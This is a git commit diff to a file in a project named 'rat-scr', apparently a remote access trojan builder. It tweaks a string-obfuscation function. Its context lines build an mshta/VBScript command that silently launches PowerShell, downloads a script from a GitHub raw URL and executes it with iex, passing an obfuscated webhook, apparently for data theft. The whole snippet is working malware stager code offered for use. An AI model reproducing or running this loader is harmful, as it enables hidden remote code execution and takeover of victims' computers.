4910e96df286634007f2a17947b49f5d07e686c9
43a1723 <hai1723notgay@gmail.com>
2024-08-19 18:55:31 +0700

    Update main.py

--- rat-scr/main.py
+++ rat-scr/main.py
@@ -1,7 +1,7 @@
 import os
 
 def obfuscate_string(s):
-    return ''.join(chr(((ord(c) + 3) % 256)) for c in s)
+    return ''.join(chr(((ord(c) + 1000) % 256)) for c in s)
 
 pythonrat = "you_webhook"
 command = f'mshta.exe vbscript:createobject("wscript.shell").run("powershell $webhook=\'{obfuscate_string(pythonrat)}\';iwr(\'https://raw.githubusercontent.com/s1uiasdad/python-rat/main/rat-scr/main.ps1\')|iex",0)(window.close)'
